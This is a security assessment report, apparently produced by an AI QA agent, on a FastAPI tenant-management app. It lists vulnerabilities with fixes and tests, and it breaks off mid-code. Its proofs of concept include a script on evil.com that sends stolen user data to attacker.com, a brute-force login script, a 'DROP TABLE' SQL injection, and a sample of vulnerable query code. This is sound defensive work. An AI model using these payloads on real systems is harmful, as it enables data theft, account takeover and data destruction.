# KOS Database - Comprehensive Security Assessment Report

**Assessment Date:** 2025-11-06
**Application:** KOS Database (Knowledge Organization System)
**Deployment:** GCP Cloud Run
**Assessment Type:** Security Vulnerability Assessment & QA Testing
**Assessed By:** QA Test Engineer Agent

---

## Executive Summary

### Overall Risk Assessment
- **Current Security Posture:** HIGH RISK
- **Critical Vulnerabilities:** 2
- **High Severity Issues:** 5
- **Medium Severity Issues:** 8
- **Low Severity Issues:** 4
- **Total Vulnerabilities Identified:** 19

### Key Findings

The KOS Database application demonstrates solid foundational architecture but contains several critical security vulnerabilities that require immediate remediation before production use. The two most critical issues are:

1. **In-memory token storage** that prevents horizontal scaling and loses sessions on deployment
2. **Wide-open CORS configuration** that allows any origin to access the API with credentials

### Business Impact

- **Availability Risk:** Token storage mechanism prevents Cloud Run auto-scaling
- **Data Breach Risk:** CORS misconfiguration enables cross-site attacks
- **Compliance Risk:** PII exposure and logging issues may violate GDPR/SOX requirements
- **Operational Risk:** Lack of rate limiting exposes system to abuse and DoS

### Recommended Priority Actions

1. **Immediate (Week 1):** Fix critical CORS and implement JWT-based authentication
2. **Short-term (Weeks 2-3):** Implement rate limiting, RBAC, and input validation
3. **Medium-term (Weeks 4-5):** Add security headers, audit logging, and encryption
4. **Long-term (Week 6+):** Comprehensive monitoring, automated testing, and documentation

---

## Application Architecture Overview

### Technology Stack
- **Backend Framework:** FastAPI (Python)
- **Database:** PostgreSQL (Cloud SQL)
- **Deployment:** GCP Cloud Run (containerized)
- **Authentication:** Custom token-based system
- **Frontend:** React (separate deployment)

### API Endpoints Inventory

#### Authentication & Authorization (5 endpoints)
- `POST /api/auth/login` - User authentication
- `POST /api/auth/logout` - Session termination
- `POST /api/auth/change-password` - Password update
- `GET /api/auth/verify` - Token validation
- `GET /api/auth/me` - Current user info

#### User Management (7 endpoints)
- `GET /api/users` - List all users
- `POST /api/users` - Create user
- `GET /api/users/{id}` - Get user details
- `PUT /api/users/{id}` - Update user
- `DELETE /api/users/{id}` - Delete user
- `GET /api/users/{id}/payments` - User payment history
- `GET /api/users/{id}/expenses` - User expense records

#### Room Management (5 endpoints)
- `GET /api/rooms` - List all rooms
- `POST /api/rooms` - Create room
- `GET /api/rooms/{id}` - Get room details
- `PUT /api/rooms/{id}` - Update room
- `DELETE /api/rooms/{id}` - Delete room

#### Tenant Management (7 endpoints)
- `GET /api/tenants` - List all tenants
- `POST /api/tenants` - Create tenant
- `GET /api/tenants/{id}` - Get tenant details
- `PUT /api/tenants/{id}` - Update tenant
- `DELETE /api/tenants/{id}` - Delete tenant
- `POST /api/tenants/{id}/assign-room` - Room assignment
- `POST /api/tenants/{id}/remove-room` - Room removal

#### Financial Management (8 endpoints)
- `GET /api/payments` - List all payments
- `POST /api/payments` - Record payment
- `GET /api/payments/{id}` - Payment details
- `PUT /api/payments/{id}` - Update payment
- `DELETE /api/payments/{id}` - Delete payment
- `GET /api/expenses` - List all expenses
- `POST /api/expenses` - Record expense
- Additional CRUD operations for expenses

#### Dashboard & Reporting (3 endpoints)
- `GET /api/dashboard/stats` - System statistics
- `GET /api/dashboard/revenue` - Revenue analytics
- `GET /api/dashboard/occupancy` - Occupancy metrics

---

## Detailed Vulnerability Assessment

### CRITICAL SEVERITY

---

#### VULN-001: In-Memory Token Storage Prevents Scaling

**Severity:** CRITICAL
**OWASP Category:** A07:2021 – Identification and Authentication Failures
**CWE ID:** CWE-384 (Session Fixation)

**Location:** `backend/security.py:9-11`

```python
# Current vulnerable implementation
active_tokens: Dict[str, dict] = {}
```

**Description:**

The application stores authentication tokens in an in-memory Python dictionary. This design has critical architectural flaws:

1. **Session Loss on Restart:** All active sessions are lost when the application restarts or redeploys
2. **No Horizontal Scaling:** Cloud Run instances cannot share session state
3. **Single Point of Failure:** Cannot distribute load across multiple instances
4. **Memory Exhaustion:** Unlimited token storage can exhaust server memory

**Proof of Concept:**

```bash
# User logs in and receives token
curl -X POST https://your-app.run.app/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
# Response: {"access_token": "abc123..."}

# Cloud Run scales up new instance or restarts
# gcloud run services update kos-backend --region=us-central1

# Token is now invalid on new instance
curl -X GET https://your-app.run.app/api/auth/verify \
  -H "Authorization: Bearer abc123..."
# Response: 401 Unauthorized (token not found)
```

**Business Impact:**
- Users randomly logged out during normal operations
- Cannot utilize Cloud Run's auto-scaling capabilities
- Poor user experience with frequent re-authentication
- Increased support burden from session issues

**Remediation:**

Implement JWT (JSON Web Tokens) for stateless authentication:

```python
# backend/security.py
from datetime import datetime, timedelta
from jose import JWTError, jwt
from passlib.context import CryptContext
import os

SECRET_KEY = os.getenv("JWT_SECRET_KEY", "your-secret-key-change-in-production")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def create_access_token(data: dict, expires_delta: timedelta = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)

    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

def verify_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            return None
        return payload
    except JWTError:
        return None

def get_current_user(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
    payload = verify_token(token)
    if payload is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Could not validate credentials",
            headers={"WWW-Authenticate": "Bearer"},
        )

    username = payload.get("sub")
    user = db.query(User).filter(User.username == username).first()
    if user is None:
        raise HTTPException(status_code=404, detail="User not found")

    return user
```

Update login endpoint:

```python
# backend/routes/auth_router.py
@router.post("/login")
async def login(credentials: LoginRequest, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.username == credentials.username).first()

    if not user or not verify_password(credentials.password, user.hashed_password):
        raise HTTPException(status_code=401, detail="Invalid credentials")

    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user.username, "role": user.role},
        expires_delta=access_token_expires
    )

    return {
        "access_token": access_token,
        "token_type": "bearer",
        "user": UserResponse.from_orm(user)
    }
```

**Alternative Solution (For Existing Token System):**

If you must maintain the current token structure, use Redis:

```python
# requirements.txt - add:
# redis==4.5.1

# backend/security.py
import redis
import os
import json

redis_client = redis.Redis(
    host=os.getenv("REDIS_HOST", "localhost"),
    port=int(os.getenv("REDIS_PORT", 6379)),
    password=os.getenv("REDIS_PASSWORD"),
    decode_responses=True
)

def store_token(token: str, user_data: dict, expire_hours: int = 24):
    redis_client.setex(
        f"token:{token}",
        timedelta(hours=expire_hours),
        json.dumps(user_data)
    )

def get_token_data(token: str):
    data = redis_client.get(f"token:{token}")
    return json.loads(data) if data else None

def invalidate_token(token: str):
    redis_client.delete(f"token:{token}")
```

**Test Cases:**

```python
# tests/test_auth_scaling.py
def test_token_survives_restart():
    # Login and get token
    response = client.post("/api/auth/login", json={"username": "test", "password": "test"})
    token = response.json()["access_token"]

    # Simulate restart (with JWT this should still work)
    response = client.get("/api/auth/verify", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 200

def test_token_works_across_instances():
    # With JWT, token should be valid on any instance
    token = create_access_token({"sub": "testuser"})

    # Simulate different instance (new app context)
    payload = verify_token(token)
    assert payload["sub"] == "testuser"
```

**References:**
- [JWT.io Introduction](https://jwt.io/introduction)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

---

#### VULN-002: Wide-Open CORS Configuration

**Severity:** CRITICAL
**OWASP Category:** A05:2021 – Security Misconfiguration
**CWE ID:** CWE-942 (Overly Permissive Cross-domain Whitelist)

**Location:** `backend/app.py:21-27`

```python
# Current vulnerable implementation
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # CRITICAL: Allows ANY origin
    allow_credentials=True,  # CRITICAL: With credentials enabled
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Description:**

The application allows requests from ANY origin (`*`) while also enabling credentials. This is a critical security misconfiguration that enables multiple attack vectors:

1. **Cross-Site Request Forgery (CSRF):** Malicious sites can make authenticated requests
2. **Data Exfiltration:** Any website can read your API responses
3. **Session Hijacking:** Credentials can be stolen via malicious sites
4. **Token Theft:** Authentication tokens exposed to any origin

**Proof of Concept:**

Attacker creates malicious website `evil.com`:

```html
<!-- evil.com/steal-data.html -->
<script>
// This script can access your API from any website
fetch('https://your-app.run.app/api/users', {
    method: 'GET',
    credentials: 'include',  // Sends user's cookies/tokens
    headers: {
        'Authorization': 'Bearer ' + stolenToken
    }
})
.then(r => r.json())
.then(data => {
    // Send all user data to attacker's server
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
```

If a logged-in user visits `evil.com`, their session is compromised.

**Business Impact:**
- Complete bypass of same-origin security policy
- Enables data breaches from any malicious website
- GDPR violation (unauthorized data access)
- Reputational damage from security breach
- Legal liability for data exposure

**Remediation:**

Configure CORS to allow only trusted origins:

```python
# backend/app.py
import os

# Get allowed origins from environment variable
ALLOWED_ORIGINS = os.getenv(
    "ALLOWED_ORIGINS",
    "http://localhost:3000,http://localhost:5173"  # Development defaults
).split(",")

# For production, set environment variable:
# ALLOWED_ORIGINS=https://your-frontend.com,https://app.yourdomain.com

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,  # Specific origins only
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],  # Explicit methods
    allow_headers=["Content-Type", "Authorization"],  # Specific headers
    max_age=3600,  # Cache preflight requests for 1 hour
)
```

Environment configuration for GCP Cloud Run:

```bash
# Set in GCP Cloud Run environment variables
gcloud run services update kos-backend \
  --region=us-central1 \
  --set-env-vars="ALLOWED_ORIGINS=https://your-production-frontend.com"
```

Alternative with more control:

```python
# backend/security.py
from fastapi import Request
from fastapi.responses import JSONResponse

ALLOWED_ORIGINS = [
    "https://your-production-frontend.com",
    "https://app.yourdomain.com",
]

# Development mode
if os.getenv("ENVIRONMENT") == "development":
    ALLOWED_ORIGINS.extend([
        "http://localhost:3000",
        "http://localhost:5173",
        "http://127.0.0.1:3000",
    ])

async def cors_validator(request: Request, call_next):
    origin = request.headers.get("origin")

    if origin and origin not in ALLOWED_ORIGINS:
        return JSONResponse(
            status_code=403,
            content={"detail": "Origin not allowed"},
        )

    response = await call_next(request)

    if origin and origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"

    return response

# Add to app
app.middleware("http")(cors_validator)
```

**Test Cases:**

```python
# tests/test_cors_security.py
def test_cors_blocks_unauthorized_origin():
    response = client.get(
        "/api/users",
        headers={"Origin": "https://evil.com"}
    )
    assert response.status_code == 403
    assert "Access-Control-Allow-Origin" not in response.headers

def test_cors_allows_authorized_origin():
    response = client.get(
        "/api/users",
        headers={"Origin": "https://your-production-frontend.com"}
    )
    assert response.headers["Access-Control-Allow-Origin"] == "https://your-production-frontend.com"

def test_cors_rejects_wildcard_with_credentials():
    # Ensure we never have both * and credentials=true
    # This test should pass after fix
    assert "*" not in ALLOWED_ORIGINS or not allow_credentials
```

**References:**
- [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html)
- [MDN CORS Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

### HIGH SEVERITY

---

#### VULN-003: No Rate Limiting on Authentication Endpoints

**Severity:** HIGH
**OWASP Category:** A07:2021 – Identification and Authentication Failures
**CWE ID:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Location:** `backend/routes/auth_router.py:15-35`

**Description:**

The login endpoint has no rate limiting, allowing unlimited authentication attempts. This enables:

1. **Brute Force Attacks:** Attackers can try unlimited passwords
2. **Credential Stuffing:** Can test leaked credentials at scale
3. **Resource Exhaustion:** Excessive requests can overload the system
4. **Account Enumeration:** Can determine valid usernames

**Proof of Concept:**

```python
# brute_force_attack.py
import requests
import itertools

url = "https://your-app.run.app/api/auth/login"
username = "admin"

# Try common passwords
passwords = ["password", "admin", "admin123", "123456", ...]

for password in passwords:
    response = requests.post(url, json={"username": username, "password": password})
    if response.status_code == 200:
        print(f"SUCCESS! Password found: {password}")
        break
    # No rate limiting, can continue indefinitely
```

**Business Impact:**
- Account compromise through brute force
- Service degradation from excessive requests
- Increased infrastructure costs
- Compliance violations (PCI-DSS, SOX)

**Remediation:**

Implement rate limiting using slowapi:

```python
# requirements.txt - add:
# slowapi==0.1.9

# backend/app.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# backend/routes/auth_router.py
from slowapi import Limiter
from fastapi import Request

@router.post("/login")
@limiter.limit("5/minute")  # 5 attempts per minute per IP
async def login(request: Request, credentials: LoginRequest, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.username == credentials.username).first()

    if not user or not verify_password(credentials.password, user.hashed_password):
        # Add exponential backoff tracking
        await track_failed_attempt(credentials.username, request.client.host)
        raise HTTPException(status_code=401, detail="Invalid credentials")

    # Clear failed attempts on success
    await clear_failed_attempts(credentials.username)

    # ... rest of login logic
```

Additional: Implement account lockout:

```python
# backend/models.py
class User(Base):
    # ... existing fields
    failed_login_attempts = Column(Integer, default=0)
    locked_until = Column(DateTime, nullable=True)

# backend/security.py
from datetime import datetime, timedelta

async def track_failed_attempt(username: str, ip_address: str):
    user = db.query(User).filter(User.username == username).first()
    if user:
        user.failed_login_attempts += 1

        # Lock account after 5 failed attempts
        if user.failed_login_attempts >= 5:
            user.locked_until = datetime.utcnow() + timedelta(minutes=15)

        db.commit()

        # Log security event
        logger.warning(f"Failed login attempt for {username} from {ip_address}")

async def clear_failed_attempts(username: str):
    user = db.query(User).filter(User.username == username).first()
    if user:
        user.failed_login_attempts = 0
        user.locked_until = None
        db.commit()

def check_account_locked(user: User):
    if user.locked_until and user.locked_until > datetime.utcnow():
        raise HTTPException(
            status_code=423,
            detail=f"Account locked until {user.locked_until.isoformat()}"
        )
```

**Test Cases:**

```python
# tests/test_rate_limiting.py
def test_login_rate_limit():
    # Should allow 5 attempts
    for i in range(5):
        response = client.post("/api/auth/login", json={"username": "test", "password": "wrong"})
        assert response.status_code == 401

    # 6th attempt should be rate limited
    response = client.post("/api/auth/login", json={"username": "test", "password": "wrong"})
    assert response.status_code == 429
    assert "Rate limit exceeded" in response.json()["detail"]

def test_account_lockout():
    # Make 5 failed attempts
    for i in range(5):
        client.post("/api/auth/login", json={"username": "test", "password": "wrong"})

    # Account should be locked
    response = client.post("/api/auth/login", json={"username": "test", "password": "correct"})
    assert response.status_code == 423
    assert "locked" in response.json()["detail"].lower()
```

---

#### VULN-004: Missing Role-Based Access Control (RBAC)

**Severity:** HIGH
**OWASP Category:** A01:2021 – Broken Access Control
**CWE ID:** CWE-862 (Missing Authorization)

**Location:** Multiple endpoints in `backend/routes/`

**Description:**

While the application has role fields in the User model (`admin`, `user`, `viewer`), there is no enforcement of role-based permissions on endpoints. Any authenticated user can:

- Create/delete users
- Modify financial records
- Access all tenant data
- Delete rooms and assignments

**Proof of Concept:**

```bash
# Login as regular user
curl -X POST https://your-app.run.app/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"regular_user","password":"password"}'
# Response: {"access_token": "user_token_123"}

# Regular user can delete other users (should be admin-only)
curl -X DELETE https://your-app.run.app/api/users/5 \
  -H "Authorization: Bearer user_token_123"
# Response: 200 OK (Should be 403 Forbidden)

# Regular user can access all financial data
curl -X GET https://your-app.run.app/api/payments \
  -H "Authorization: Bearer user_token_123"
# Response: All payment records (should be restricted)
```

**Business Impact:**
- Unauthorized data access and modification
- Insider threats from disgruntled employees
- Compliance violations (SOX, GDPR)
- Potential fraud through financial record tampering
- Data integrity compromise

**Remediation:**

Implement RBAC decorators and middleware:

```python
# backend/security.py
from functools import wraps
from fastapi import HTTPException, status
from typing import List

def require_roles(allowed_roles: List[str]):
    """
    Decorator to enforce role-based access control
    Usage: @require_roles(["admin", "manager"])
    """
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            # Get current user from dependency injection
            current_user = kwargs.get('current_user')

            if not current_user:
                raise HTTPException(
                    status_code=status.HTTP_401_UNAUTHORIZED,
                    detail="Authentication required"
                )

            if current_user.role not in allowed_roles:
                raise HTTPException(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail=f"Insufficient permissions. Required roles: {', '.join(allowed_roles)}"
                )

            return await func(*args, **kwargs)
        return wrapper
    return decorator

# Alternative: Dependency injection approach
def require_admin(current_user: User = Depends(get_current_user)):
    if current_user.role != "admin":
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Admin access required"
        )
    return current_user

def require_admin_or_manager(current_user: User = Depends(get_current_user)):
    if current_user.role not in ["admin", "manager"]:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Admin or manager access required"
        )
    return current_user
```

Apply RBAC to endpoints:

```python
# backend/routes/user_router.py

# List users - all authenticated users can view
@router.get("/", response_model=List[UserResponse])
async def list_users(
    current_user: User = Depends(get_current_user),  # Any authenticated user
    db: Session = Depends(get_db)
):
    users = db.query(User).all()
    return users

# Create user - admin only
@router.post("/", response_model=UserResponse)
async def create_user(
    user: UserCreate,
    current_user: User = Depends(require_admin),  # Admin only
    db: Session = Depends(get_db)
):
    # ... create user logic

# Update user - admin or self
@router.put("/{user_id}", response_model=UserResponse)
async def update_user(
    user_id: int,
    user_update: UserUpdate,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # Check if admin or updating own profile
    if current_user.role != "admin" and current_user.id != user_id:
        raise HTTPException(
            status_code=403,
            detail="Can only update your own profile"
        )

    # Prevent non-admins from changing roles
    if user_update.role and current_user.role != "admin":
        raise HTTPException(
            status_code=403,
            detail="Only admins can change user roles"
        )

    # ... update logic

# Delete user - admin only
@router.delete("/{user_id}")
async def delete_user(
    user_id: int,
    current_user: User = Depends(require_admin),
    db: Session = Depends(get_db)
):
    # ... delete logic
```

Financial endpoints with RBAC:

```python
# backend/routes/payment_router.py

@router.get("/", response_model=List[PaymentResponse])
async def list_payments(
    current_user: User = Depends(require_admin_or_manager),  # Restricted access
    db: Session = Depends(get_db)
):
    payments = db.query(Payment).all()
    return payments

@router.post("/", response_model=PaymentResponse)
async def create_payment(
    payment: PaymentCreate,
    current_user: User = Depends(require_admin_or_manager),
    db: Session = Depends(get_db)
):
    # ... create payment logic

@router.delete("/{payment_id}")
async def delete_payment(
    payment_id: int,
    current_user: User = Depends(require_admin),  # Only admin can delete
    db: Session = Depends(get_db)
):
    # ... delete logic
```

Define clear role hierarchy:

```python
# backend/schemas.py
from enum import Enum

class UserRole(str, Enum):
    ADMIN = "admin"          # Full system access
    MANAGER = "manager"      # Can manage tenants, rooms, finances
    USER = "user"            # Can view and create basic records
    VIEWER = "viewer"        # Read-only access

# Update User model
class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True)
    username = Column(String, unique=True, nullable=False)
    email = Column(String, unique=True, nullable=False)
    hashed_password = Column(String, nullable=False)
    role = Column(Enum(UserRole), default=UserRole.USER)  # Enum for validation
    created_at = Column(DateTime, default=datetime.utcnow)
```

**Test Cases:**

```python
# tests/test_rbac.py

def test_admin_can_create_users():
    admin_token = get_token_for_role("admin")
    response = client.post(
        "/api/users",
        headers={"Authorization": f"Bearer {admin_token}"},
        json={"username": "newuser", "email": "new@test.com", "password": "pass123"}
    )
    assert response.status_code == 200

def test_regular_user_cannot_create_users():
    user_token = get_token_for_role("user")
    response = client.post(
        "/api/users",
        headers={"Authorization": f"Bearer {user_token}"},
        json={"username": "newuser", "email": "new@test.com", "password": "pass123"}
    )
    assert response.status_code == 403
    assert "Insufficient permissions" in response.json()["detail"]

def test_user_can_update_own_profile():
    user_token = get_token_for_user(user_id=5)
    response = client.put(
        "/api/users/5",
        headers={"Authorization": f"Bearer {user_token}"},
        json={"email": "newemail@test.com"}
    )
    assert response.status_code == 200

def test_user_cannot_update_other_profile():
    user_token = get_token_for_user(user_id=5)
    response = client.put(
        "/api/users/6",  # Different user
        headers={"Authorization": f"Bearer {user_token}"},
        json={"email": "newemail@test.com"}
    )
    assert response.status_code == 403

def test_user_cannot_change_own_role():
    user_token = get_token_for_user(user_id=5, role="user")
    response = client.put(
        "/api/users/5",
        headers={"Authorization": f"Bearer {user_token}"},
        json={"role": "admin"}
    )
    assert response.status_code == 403
    assert "Only admins can change user roles" in response.json()["detail"]

def test_viewer_has_read_only_access():
    viewer_token = get_token_for_role("viewer")

    # Can view
    response = client.get("/api/tenants", headers={"Authorization": f"Bearer {viewer_token}"})
    assert response.status_code == 200

    # Cannot create
    response = client.post(
        "/api/tenants",
        headers={"Authorization": f"Bearer {viewer_token}"},
        json={"name": "New Tenant"}
    )
    assert response.status_code == 403
```

---

#### VULN-005: Weak Password Policy

**Severity:** HIGH
**OWASP Category:** A07:2021 – Identification and Authentication Failures
**CWE ID:** CWE-521 (Weak Password Requirements)

**Location:** `backend/schemas.py:UserCreate`, `backend/routes/auth_router.py`

**Description:**

The application has no password strength requirements. Users can set passwords like:
- "123"
- "password"
- "a"
- User's own username

This makes accounts vulnerable to brute force and credential stuffing attacks.

**Proof of Concept:**

```bash
curl -X POST https://your-app.run.app/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"test@test.com","password":"123"}'
# Response: 200 OK (Should reject weak password)
```

**Business Impact:**
- Easy account compromise
- Increased brute force success rate
- Compliance violations (NIST, PCI-DSS)
- Reputational damage from breaches

**Remediation:**

Implement password strength validation:

```python
# backend/security.py
import re
from typing import Tuple

def validate_password_strength(password: str, username: str = None, email: str = None) -> Tuple[bool, str]:
    """
    Validate password meets security requirements
    Returns: (is_valid, error_message)
    """
    # Minimum length
    if len(password) < 8:
        return False, "Password must be at least 8 characters long"

    # Maximum length (prevent DoS via bcrypt)
    if len(password) > 128:
        return False, "Password must be less than 128 characters"

    # Complexity requirements
    has_uppercase = bool(re.search(r'[A-Z]', password))
    has_lowercase = bool(re.search(r'[a-z]', password))
    has_digit = bool(re.search(r'\d', password))
    has_special = bool(re.search(r'[!@#$%^&*(),.?":{}|<>]', password))

    complexity_count = sum([has_uppercase, has_lowercase, has_digit, has_special])

    if complexity_count < 3:
        return False, "Password must contain at least 3 of: uppercase, lowercase, digit, special character"

    # Check against username/email
    if username and username.lower() in password.lower():
        return False, "Password cannot contain username"

    if email:
        email_local = email.split('@')[0]
        if email_local.lower() in password.lower():
            return False, "Password cannot contain email address"

    # Common password check (add more as needed)
    common_passwords = [
        "password", "password123", "admin", "admin123",
        "12345678", "qwerty", "letmein", "welcome"
    ]

    if password.lower() in common_passwords:
        return False, "Password is too common. Please choose a stronger password"

    return True, ""

# Optional: Check against leaked passwords
def check_pwned_password(password: str) -> bool:
    """
    Check if password appears in Have I Been Pwned database
    Uses k-anonymity to protect password privacy
    """
    import hashlib
    import requests

    sha1_hash = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix = sha1_hash[:5]
    suffix = sha1_hash[5:]

    try:
        response = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=2)
        if response.status_code == 200:
            hashes = response.text.split('\r\n')
            for hash_line in hashes:
                hash_suffix, count = hash_line.split(':')
                if hash_suffix == suffix:
                    return True  # Password found in breach database
    except:
        pass  # Don't block user if API is down

    return False
```

Apply validation in schemas:

```python
# backend/schemas.py
from pydantic import BaseModel, validator, EmailStr
from backend.security import validate_password_strength, check_pwned_password

class UserCreate(BaseModel):
    username: str
    email: EmailStr
    password: str
    role: str = "user"

    @validator('password')
    def validate_password(cls, password, values):
        username = values.get('username')
        email = values.get('email')

        # Check strength
        is_valid, error_message = validate_password_strength(password, username, email)
        if not is_valid:
            raise ValueError(error_message)

        # Optional: Check against breach database
        if check_pwned_password(password):
            raise ValueError(
                "This password has been exposed in a data breach. "
                "Please choose a different password."
            )

        return password

    @validator('username')
    def validate_username(cls, username):
        if len(username) < 3:
            raise ValueError("Username must be at least 3 characters")
        if len(username) > 50:
            raise ValueError("Username must be less than 50 characters")
        if not re.match(r'^[a-zA-Z0-9_-]+$', username):
            raise ValueError("Username can only contain letters, numbers, underscores, and hyphens")
        return username

class PasswordChangeRequest(BaseModel):
    old_password: str
    new_password: str

    @validator('new_password')
    def validate_new_password(cls, password):
        is_valid, error_message = validate_password_strength(password)
        if not is_valid:
            raise ValueError(error_message)
        return password
```

Update password change endpoint:

```python
# backend/routes/auth_router.py

@router.post("/change-password")
async def change_password(
    request: PasswordChangeRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # Verify old password
    if not verify_password(request.old_password, current_user.hashed_password):
        raise HTTPException(status_code=401, detail="Current password is incorrect")

    # Ensure new password is different
    if verify_password(request.new_password, current_user.hashed_password):
        raise HTTPException(status_code=400, detail="New password must be different from current password")

    # Additional validation (already done in schema, but double-check)
    is_valid, error = validate_password_strength(
        request.new_password,
        current_user.username,
        current_user.email
    )
    if not is_valid:
        raise HTTPException(status_code=400, detail=error)

    # Update password
    current_user.hashed_password = get_password_hash(request.new_password)
    current_user.password_changed_at = datetime.utcnow()
    db.commit()

    return {"message": "Password changed successfully"}
```

**Test Cases:**

```python
# tests/test_password_policy.py

def test_password_minimum_length():
    with pytest.raises(ValueError, match="at least 8 characters"):
        UserCreate(username="test", email="test@test.com", password="short")

def test_password_complexity_requirements():
    # Too simple
    with pytest.raises(ValueError, match="at least 3 of"):
        UserCreate(username="test", email="test@test.com", password="password")

    # Good complexity
    user = UserCreate(username="test", email="test@test.com", password="Password123!")
    assert user.password == "Password123!"

def test_password_cannot_contain_username():
    with pytest.raises(ValueError, match="cannot contain username"):
        UserCreate(username="john", email="john@test.com", password="John12345!")

def test_common_password_rejected():
    with pytest.raises(ValueError, match="too common"):
        UserCreate(username="test", email="test@test.com", password="Password123")

def test_strong_password_accepted():
    user = UserCreate(
        username="testuser",
        email="test@test.com",
        password="MyStr0ng!Pass"
    )
    assert user.password == "MyStr0ng!Pass"
```

---

#### VULN-006: SQL Injection via String Formatting

**Severity:** HIGH
**OWASP Category:** A03:2021 – Injection
**CWE ID:** CWE-89 (SQL Injection)

**Location:** `backend/database.py:57-62` (if raw SQL used) and potential query builders

**Description:**

While SQLAlchemy ORM generally protects against SQL injection, there may be locations using raw SQL queries or unsafe string formatting for dynamic queries.

**Potential Vulnerable Pattern:**

```python
# VULNERABLE - DO NOT USE
@router.get("/users/search")
async def search_users(query: str, db: Session = Depends(get_db)):
    # String formatting - VULNERABLE
    sql = f"SELECT * FROM users WHERE username LIKE '%{query}%'"
    result = db.execute(sql)
    return result.fetchall()
```

**Proof of Concept:**

```bash
# Normal query
curl "https://your-app.run.app/api/users/search?query=john"

# SQL Injection attack
curl "https://your-app.run.app/api/users/search?query='; DROP TABLE users; --"
# This could delete the entire users table
```

**Remediation:**

Always use parameterized queries:

```python
# SAFE - Parameterized query
@router.get("/users/search")
async def search_users(query: str, db: Session = Depends(get_db)):
    # Using SQLAlchemy ORM (safe)
    users = db.query(User).filter(User.username.like(f"%{query}%")).all()
    return users

# SAFE - Raw SQL with parameters
@router.get("/users/search")
async def search_users(query: str, db: Session = Depends(get_db)):
    from sqlalchemy import text

    sql = text("SELECT * FROM users WHERE username LIKE :search_query")
    result = db.execute(sql, {"search_query": f"%{query}%"})
    return result.fetchall()
```

Search all code for potential SQL injection:

```bash
# Check for dangerous patterns
grep -r "f\"SELECT" backend/
grep -r "execute(\"" backend/
grep -r ".format(" backend/ | grep -i "select\|insert\|update\|delete"
```

---

#### VULN-007: Sensitive Data Exposure in Logs

**Severity:** HIGH
**OWASP Category:** A09:2021 – Security Logging and Monitoring Failures
**CWE ID:** CWE-532 (Insertion of Sensitive Information into Log File)

**Location:** Various logging statements throughout codebase

**Description:**

Application logs may contain sensitive information such as:
- Passwords (even hashed)
- Authentication tokens
- Personal identifiable information (PII)
- Financial data
- Database connection strings

**Proof of Concept:**

```python
# VULNERABLE logging
logger.info(f"User login attempt: {credentials.username} with password: {credentials.password}")
logger.debug(f"Generated token: {access_token}")
logger.info(f"User data: {user.__dict__}")  # Contains hashed password
```

**Remediation:**

Implement safe logging practices:

```python
# backend/logging_config.py
import logging
import re
from typing import Any

class SensitiveDataFilter(logging.Filter):
    """Filter sensitive data from log records"""

    SENSITIVE_PATTERNS = [
        (re.compile(r'(password["\']?\s*[:=]\s*["\']?)([^"\'}\s]+)', re.I), r'\1***REDACTED***'),
        (re.compile(r'(token["\']?\s*[:=]\s*["\']?)([^"\'}\s]+)', re.I), r'\1***REDACTED***'),
        (re.compile(r'(api[_-]?key["\']?\s*[:=]\s*["\']?)([^"\'}\s]+)', re.I), r'\1***REDACTED***'),
        (re.compile(r'(authorization["\']?\s*[:=]\s*["\']?(?:Bearer\s+)?)([^"\'}\s]+)', re.I), r'\1***REDACTED***'),
        (re.compile(r'\b([0-9]{13,19})\b'), r'***CARD***'),  # Credit card numbers
        (re.compile(r'\b([0-9]{3}-[0-9]{2}-[0-9]{4})\b'), r'***SSN***'),  # SSN
    ]

    def filter(self, record: logging.LogRecord) -> bool:
        record.msg = self.redact_sensitive_data(str(record.msg))
        if record.args:
